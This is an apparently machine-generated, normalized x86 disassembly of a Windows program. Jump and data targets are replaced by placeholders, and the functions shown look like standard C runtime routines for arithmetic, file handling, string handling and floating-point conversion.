mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_438260
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_43827f
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
and ecx 0xfff7ffff
and eax ecx
push esi
mov esi [ ebp + 0x8 ]
test eax 0xfcf0fce0
je r-xdata
push ecx
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_43a855
call sub_43a855
mov [ esi ] eax
jmp r-xdata
call sub_427b11
push 0x16
pop esi
mov [ eax ] esi
call sub_42a231
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_43a855
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_4382dc
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x10 ]
push esi
mov esi [ ebx + 0xc ]
movzx ecx [ eax ]
mov eax [ esi ]
push edi
mov [ ebp - 0x84 ] ecx
dec eax
je r-xdata
push 0x8
dec eax
je r-xdata
mov ecx [ ebp - 0x84 ]
mov ecx [ ebx + 0x8 ]
cmp ecx 0x10
je r-xdata
push 0x4
jmp r-xdata
dec eax
je r-xdata
push [ esi ]
call sub_431f5d
pop ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
fld [ esi + 0x10 ]
and eax 0xffffffe3
fstp [ ebp - 0x50 ]
or eax 0x3
mov [ ebp - 0x40 ] eax
cmp ecx 0x16
je r-xdata
pop edi
push ecx
lea eax [ esi + 0x18 ]
push eax
push edi
call sub_431a7b
add esp 0xc
test eax eax
jne r-xdata
push 0x11
jmp r-xdata
dec eax
je r-xdata
push esi
call sub_436e0f
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x1d
je r-xdata
push 0x12
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_421ed7
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
and [ ebp - 0x40 ] 0xfffffffe
jmp r-xdata
dec eax
dec eax
je r-xdata
lea eax [ esi + 0x18 ]
push eax
lea eax [ esi + 0x8 ]
push eax
push ecx
push edi
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_431c57
add esp 0x18
mov [ esi ] 0x1
jmp r-xdata
dec eax
jne r-xdata
push 0xffff
push ecx
call sub_43200f
cmp [ esi ] 0x8
pop ecx
pop ecx
je r-xdata
push 0x10
jmp r-xdata
sub_4383e5
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push 0x1
push esi
push esi
push edi
mov ebx esi
mov [ ebp - 0x8 ] esi
call sub_42cb83
mov ecx edx
mov [ ebp - 0x18 ] eax
and eax ecx
add esp 0x10
mov [ ebp - 0x14 ] ecx
cmp eax 0xffffffff
je r-xdata
call sub_427b11
mov eax [ eax ]
push 0x2
push esi
push esi
push edi
call sub_42cb83
mov ecx eax
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
sub esi ecx
sbb eax edx
mov [ ebp - 0x4 ] eax
js r-xdata
test eax eax
jg r-xdata
jg r-xdata
push 0x0
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push edi
call sub_42cb83
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
push 0x1000
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_42cb83
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
test esi esi
jae r-xdata
push 0x8000
push edi
call sub_4385c3
pop ecx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_427b11
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push edi
call sub_43525c
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov ebx eax
mov eax edx
mov ecx ebx
and ecx eax
mov [ ebp - 0x8 ] eax
cmp ecx 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_427b11
mov [ eax ] 0xd
call sub_427add
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
call sub_427add
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
mov eax [ ebp - 0x4 ]
sbb eax edx
mov [ ebp - 0x4 ] eax
js r-xdata
mov eax 0x1000
jmp r-xdata
cmp esi 0x1000
jb r-xdata
or ebx 0xffffffff
or [ ebp - 0x8 ] ebx
call sub_427b11
mov [ eax ] 0xd
push [ ebp - 0x10 ]
push edi
call sub_4385c3
pop ecx
pop ecx
push [ ebp - 0xc ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
jg r-xdata
push eax
push [ ebp - 0xc ]
push edi
call sub_42c109
add esp 0xc
cmp eax 0xffffffff
je r-xdata
and ebx [ ebp - 0x8 ]
cmp ebx 0xffffffff
je r-xdata
test eax eax
jl r-xdata
test esi esi
je r-xdata
jmp r-xdata
sub_438599
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
xor eax eax
pop ebp
retn
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
push 0x16
pop eax
pop ebp
retn
sub_4385c3
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx esi
sar ebx 0x5
and esi 0x1f
shl esi 0x6
push edi
mov edi [ ebx * 4 + rw-data ]
mov cl [ edi + esi + 0x4 ]
movzx eax cl
and eax 0x80
mov [ ebp + 0x8 ] eax
mov al [ edi + esi + 0x24 ]
add al al
movsx edx al
mov eax [ ebp + 0xc ]
sar edx 0x1
cmp eax 0x4000
je r-xdata
or cl 0x80
mov [ edi + esi + 0x4 ] cl
mov eax [ ebx * 4 + rw-data ]
and [ eax + esi + 0x24 ] 0x80
cmp eax 0x8000
je r-xdata
neg edx
sbb edx edx
and edx 0xc000
lea eax [ edx + 0x4000 ]
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and cl 0x7f
mov [ edi + esi + 0x4 ] cl
jmp r-xdata
cmp eax 0x10000
je r-xdata
cmp [ ebp + 0x8 ] 0x0
pop edi
pop esi
pop ebx
jne r-xdata
or cl 0x80
mov [ edi + esi + 0x4 ] cl
mov ecx [ ebx * 4 + rw-data ]
mov al [ ecx + esi + 0x24 ]
and al 0x82
or al 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov [ ecx + esi + 0x24 ] al
jmp r-xdata
cmp eax 0x40000
jne r-xdata
or cl 0x80
mov [ edi + esi + 0x4 ] cl
mov ecx [ ebx * 4 + rw-data ]
mov al [ ecx + esi + 0x24 ]
and al 0x81
or al 0x1
sub_438690
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
call sub_42b76c
pop ecx
mov ecx [ esi + 0xc ]
mov edi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_427b11
mov [ eax ] 0x9
push ebx
xor ebx ebx
test cl 0x1
je r-xdata
call sub_427b11
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test cl 0x10
je r-xdata
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
test [ esi + 0xc ] 0x108
je r-xdata
call sub_4240a2
add eax 0x20
cmp esi eax
je r-xdata
or ecx 0x20
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
and ecx 0xfffffffe
mov [ esi ] eax
mov [ esi + 0xc ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push edi
mov [ ebp + 0xc ] 0x2
call sub_42c027
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov ebx eax
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
lea eax [ edx + 0x2 ]
mov [ esi ] eax
mov eax [ esi + 0x18 ]
sub ecx edx
sub eax 0x2
mov [ ebp + 0xc ] ecx
mov [ esi + 0x4 ] eax
test ecx ecx
jle r-xdata
push edi
call sub_433ef7
pop ecx
test eax eax
jne r-xdata
call sub_4240a2
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax cx
or [ esi + 0xc ] 0x20
cmp edi 0xffffffff
je r-xdata
push ecx
push edx
push edi
call sub_42c027
add esp 0xc
mov ebx eax
jmp r-xdata
push esi
call sub_42eb5f
pop ecx
pop ebx
mov ecx rw-data
cmp edi 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push 0x2
push ebx
push ebx
push edi
call sub_42ca87
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov ecx edi
mov eax edi
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
test [ ecx + 0x4 ] 0x20
je r-xdata
sub_438830
push ebx
push esi
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
test ebx 0xffffffff
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub ecx edx
test edx 0x3
je r-xdata
lea eax [ edx + ecx ]
and eax 0xfff
cmp eax 0xffc
ja r-xdata
movzx eax [ edx + ecx ]
cmp al [ edx ]
jne r-xdata
mov eax [ edx + ecx ]
cmp eax [ edx ]
jne r-xdata
sbb eax eax
or eax 0x1
pop esi
pop ebx
retn
test eax eax
cmove ebx eax
inc edx
sub ebx 0x1
jbe r-xdata
sub ebx 0x4
jbe r-xdata
test dl 0x3
jne r-xdata
lea esi [ eax - 0x1010101 ]
add edx 0x4
not eax
and eax esi
test eax 0x80808080
je r-xdata
sub_4388a8
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_438913
add esp 0x10
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
mov eax 0x7fffffff
jmp r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_43abf0
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
mov eax esi
jmp r-xdata
sub_438913
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
leave
retn
push ebx
push esi
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_4247f2
mov edi [ ebp + 0x8 ]
mov esi 0x7fffffff
test edi edi
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx esi
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
sub edi ebx
push ecx
push ebx
push edi
call sub_43abf0
add esp 0xc
mov esi eax
jmp r-xdata
sub esi eax
test esi esi
je r-xdata
cmp esi eax
je r-xdata
movzx eax [ edi + ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_427b7e
mov esi eax
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_427b7e
add esp 0x10
inc ebx
dec [ ebp + 0x10 ]
je r-xdata
sub_4389c2
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4389eb
pop ebp
retn
sub_4389eb
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
test ecx ecx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
push ebx
push edi
ja r-xdata
call sub_427b11
push 0x16
pop esi
mov [ eax ] esi
call sub_42a231
mov eax esi
jmp r-xdata
mov edx [ ebp + 0x18 ]
xor eax eax
test edx edx
mov [ ecx ] ax
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
call sub_427b11
push 0x16
pop esi
pop ebp
retn 0x14
mov eax [ ebp + 0x14 ]
push 0x22
add eax 0xfffffffe
pop esi
cmp eax esi
ja r-xdata
call sub_427b11
push 0x22
jmp r-xdata
mov [ eax ] esi
call sub_42a231
mov eax esi
jmp r-xdata
xor eax eax
test edx edx
mov edx [ ebp + 0x8 ]
mov [ ebp + 0x18 ] eax
mov edi ecx
je r-xdata
pop esi
jmp r-xdata
pop edi
pop ebx
mov ecx [ ebp + 0x18 ]
mov ebx edi
push 0x2d
pop eax
mov [ ecx ] ax
xor eax eax
inc eax
lea edi [ ecx + 0x2 ]
mov [ ebp + 0x18 ] eax
neg edx
add eax 0x30
add eax 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ edi ] ax
add edi 0x2
inc ecx
test edx edx
je r-xdata
xor eax eax
mov [ edi ] ax
sub edi 0x2
xor eax eax
mov [ ecx ] ax
call sub_427b11
mov eax edx
xor edx edx
div [ ebp + 0x14 ]
mov [ ebp + 0x8 ] edx
mov edx eax
mov eax [ ebp + 0x8 ]
cmp eax 0x9
jbe r-xdata
movzx ecx [ edi ]
mov ax [ ebx ]
mov [ edi ] ax
mov [ ebx ] cx
sub edi 0x2
add ebx 0x2
cmp ebx edi
jb r-xdata
xor eax eax
sub_438ade
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
mov ecx [ ebx + 0x8 ]
mov dx [ ebx + 0xc ]
sub esp 0x20
cmp [ rw-data ] 0x1
jl r-xdata
movzx eax [ ecx ]
test ax ax
jne r-xdata
movzx eax dx
movd xmm0 eax
pshuflw xmm0 xmm0 0x0
pshufd xmm2 xmm0 0x0
cmp ax dx
je r-xdata
xor eax eax
cmp [ ecx ] dx
setne al
dec eax
and eax ecx
jmp r-xdata
movzx eax [ ecx ]
cmp ax dx
je r-xdata
movdqu xmm0 [ ecx ]
pxor xmm1 xmm1
pcmpeqw xmm1 xmm0
pcmpeqw xmm0 xmm2
por xmm1 xmm0
pmovmskb eax xmm1
test eax eax
jne r-xdata
add ecx 0x2
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
mov eax ecx
test ax ax
je r-xdata
bsf eax eax
mov [ ebp - 0x4 ] eax
add ecx eax
jmp r-xdata
add ecx 0x10
jmp r-xdata
xor eax eax
jmp r-xdata
add ecx 0x2
jmp r-xdata
mov eax ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
sub_438b8c
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
push ebx
movzx eax [ ecx + 0xa ]
mov edx eax
and eax 0x8000
mov [ ebp - 0x44 ] eax
mov eax [ ecx + 0x6 ]
mov [ ebp - 0x10 ] eax
mov eax [ ecx + 0x2 ]
mov [ ebp - 0xc ] eax
movzx eax [ ecx ]
and edx 0x7fff
push esi
sub edx 0x3fff
push edi
mov edi [ ebp + 0xc ]
shl eax 0x10
xor ebx ebx
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x8 ] eax
cmp edx 0xffffc001
jne r-xdata
mov eax [ rw-data ]
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
dec eax
movsd [ edi ] [ esi ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x34 ] eax
mov eax ecx
cdq
push 0x1f
movsd [ edi ] [ esi ]
pop esi
and edx esi
add edx eax
sar edx 0x5
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x3c ] edx
and ecx 0x8000001f
jns r-xdata
mov esi ebx
mov eax ebx
sub esi ecx
xor eax eax
inc eax
mov ecx esi
shl eax cl
push 0x3
or edi 0xffffffff
mov [ ebp - 0x30 ] esi
pop esi
test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
inc eax
cmp eax 0x3
jl r-xdata
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
lea eax [ edx + 0x1 ]
cmp eax esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov edi [ ebp - 0x40 ]
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
cmp [ ebp - 0x2c ] ebx
je r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + eax * 4 ]
sub ecx eax
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ edi + 0x4 ] esi
mov [ edi ] eax
jmp r-xdata
push 0x1f
pop eax
sub eax [ rw-data ]
mov ecx eax
mov eax [ ebp - 0x44 ]
shl esi cl
neg eax
sbb eax eax
and eax 0x80000000
or esi eax
mov eax [ rw-data ]
or esi [ ebp - 0x10 ]
cmp eax 0x40
jne r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp ecx eax
jge r-xdata
inc ecx
mov eax [ ebp - 0x34 ]
cdq
push 0x1f
pop ecx
and edx ecx
add edx eax
mov eax [ ebp - 0x34 ]
sar edx 0x5
and eax 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
mov [ edi ] esi
cmp ecx edx
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
sub ecx eax
xor eax eax
inc eax
shl eax cl
push 0xffffffff
mov [ ebp - 0x2c ] ebx
pop edi
mov [ ebp - 0x38 ] eax
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx [ ebp - 0x38 ]
add ecx eax
mov [ ebp - 0x28 ] ecx
cmp ecx eax
mov eax [ ebp - 0x28 ]
mov ecx ebx
jb r-xdata
dec eax
or eax 0xffffffe0
inc eax
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
cmp ecx [ rw-data ]
jl r-xdata
sub edx [ ebp - 0x24 ]
lea esi [ ebp - 0x1c ]
mov [ ebp - 0x30 ] edx
mov eax edx
cdq
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
and edx 0x1f
add eax edx
sar eax 0x5
movsd [ edi ] [ esi ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
and eax 0x8000001f
jns r-xdata
push 0x2
pop ebx
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax [ ebp - 0x38 ]
jae r-xdata
mov edx [ ebp - 0x3c ]
mov esi [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
add esi ecx
mov ecx [ rw-data ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
mov ecx [ rw-data ]
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x34 ] eax
and ecx 0x8000001f
jns r-xdata
mov [ ebp - 0x30 ] eax
or edi 0xffffffff
mov eax edi
mov edi [ ebp - 0x30 ]
mov ecx edi
shl eax cl
push 0x20
mov [ ebp - 0x20 ] ebx
not eax
mov [ ebp - 0x28 ] eax
pop eax
sub eax edi
push 0x3
mov [ ebp - 0x38 ] eax
pop esi
dec eax
or eax 0xffffffe0
inc eax
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
js r-xdata
shl edi cl
push 0x20
mov [ ebp - 0x20 ] ebx
mov esi ebx
pop eax
mov ebx ecx
sub eax ebx
mov [ ebp - 0x24 ] ecx
not edi
mov [ ebp - 0x24 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
or edi 0xffffffff
shl edi cl
push 0x20
pop eax
sub eax ecx
mov [ ebp - 0x38 ] ecx
not edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov eax edx
and eax [ ebp - 0x28 ]
mov ecx edi
shr edx cl
mov ecx [ ebp - 0x38 ]
shl eax cl
or edx [ ebp - 0x20 ]
inc ebx
mov [ ebp + ebx * 4 - 0x14 ] edx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov eax [ ebp - 0x3c ]
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
mov eax [ ebp - 0x3c ]
xor ebx ebx
pop ecx
or edi 0xffffffff
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] edi
mov eax edi
jb r-xdata
mov edx [ ebp + esi * 4 - 0x10 ]
mov eax edx
mov ecx ebx
shr edx cl
mov ecx [ ebp - 0x24 ]
and eax edi
shl eax cl
or edx [ ebp - 0x20 ]
inc esi
mov [ ebp + esi * 4 - 0x14 ] edx
mov [ ebp - 0x20 ] eax
cmp esi 0x3
jl r-xdata
mov edi [ ebp - 0x28 ]
mov esi [ ebp - 0x38 ]
mov eax edi
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
pop ecx
xor ebx ebx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov eax edx
shr edx cl
mov ecx [ ebp - 0x28 ]
and eax edi
shl eax cl
or edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x38 ]
mov [ ebp + ebx * 4 - 0x10 ] edx
inc ebx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov esi [ ebp - 0x34 ]
mov eax esi
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
pop ecx
xor ebx ebx
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
mov eax [ ebp - 0x3c ]
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax 0x1
jae r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
cmp ecx eax
jl r-xdata
mov ecx [ ebp - 0x34 ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add edx eax
sar edx 0x5
mov [ ebp - 0x2c ] edx
and ecx 0x8000001f
jns r-xdata
sub edx 0x4
dec ecx
jns r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
jns r-xdata
cmp ecx edi
jl r-xdata
sub edx 0x4
dec ecx
jns r-xdata
cmp ecx esi
jl r-xdata
mov esi [ rw-data ]
add esi [ rw-data ]
xor ebx ebx
inc ebx
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
push 0x1f
pop eax
sub eax ecx
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x30 ]
xor eax eax
inc eax
shl eax cl
test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
inc edx
cmp edx esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + edx * 4 ]
sub ecx edx
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
mov [ ebp - 0x24 ] ecx
shl edi cl
mov eax ebx
push 0x20
mov [ ebp - 0x20 ] ebx
mov ebx [ ebp - 0x24 ]
pop ecx
sub ecx ebx
not edi
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x24 ] ecx
dec ecx
or ecx 0xffffffe0
inc ecx
mov edi [ ebp - 0x34 ]
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add edx eax
sar edx 0x5
and edi 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov edx [ ebp + eax * 4 - 0x10 ]
mov eax edx
mov ecx ebx
shr edx cl
mov ecx [ ebp - 0x34 ]
and eax edi
or edx [ ebp - 0x20 ]
mov [ ebp + ecx * 4 - 0x10 ] edx
mov ecx [ ebp - 0x24 ]
shl eax cl
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
inc eax
mov [ ebp - 0x34 ] eax
cmp eax esi
jl r-xdata
mov esi [ ebp - 0x28 ]
mov eax esi
shl eax 0x2
lea edx [ ebp - 0x8 ]
push 0x2
sub edx eax
pop ecx
xor ebx ebx
mov eax [ ebp + edx * 4 - 0x10 ]
sub ecx edi
xor edi edi
inc edi
shl edi cl
push 0xffffffff
mov ecx ebx
mov [ ebp - 0x24 ] edi
add edi eax
mov [ ebp - 0x20 ] edi
cmp edi eax
mov eax [ ebp - 0x20 ]
pop edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
xor ecx ecx
inc ecx
cmp eax [ ebp - 0x24 ]
jae r-xdata
mov edx [ ebp - 0x2c ]
cmp ecx esi
jl r-xdata
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
js r-xdata
mov esi ebx
jmp r-xdata
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x20 ] edi
mov eax edi
jb r-xdata
xor ecx ecx
inc ecx
cmp eax 0x1
jae r-xdata
dec edx
mov [ ebp + edx * 4 - 0xc ] eax
jns r-xdata
sub_4390fc
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
push ebx
movzx eax [ ecx + 0xa ]
mov edx eax
and eax 0x8000
mov [ ebp - 0x44 ] eax
mov eax [ ecx + 0x6 ]
mov [ ebp - 0x10 ] eax
mov eax [ ecx + 0x2 ]
mov [ ebp - 0xc ] eax
